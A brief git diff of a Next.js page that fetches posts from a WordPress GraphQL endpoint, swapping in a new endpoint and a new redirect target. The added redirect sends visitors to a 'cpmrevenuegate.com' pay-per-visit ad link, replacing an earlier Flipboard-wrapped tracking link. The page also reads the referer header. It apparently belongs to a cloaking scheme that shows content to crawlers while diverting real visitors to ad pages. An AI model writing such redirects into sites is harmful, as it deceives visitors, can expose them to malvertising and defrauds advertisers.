@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = "https://dev-rashid-test.pantheonsite.io/graphql"
+	const endpoint = "https://alcashzone.com/graphql"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://flipboard.com/redirect?url=https%3A%2F%2Fheateradvisoraplenty.com%2Fvdccri65t9%3Fkey%3D084d35bf232688c4a2edb6fb7c9a058a%26utm_source%3Dflipboard%26utm_content%3Drashid155%252Fmagazine%252FNews%2BVirla&v=HfCmc4qNbejhpKKMoF1GGuwhoUtuFyIF2GuFea9DZ7sAAAGR4-nZSA/` + encodeURI(path as string)
+					`https://www.cpmrevenuegate.com/axexvgzr?key=84023a9580e274f0e22f9e9569b0646f/`
 				}`,
 			},
 		};
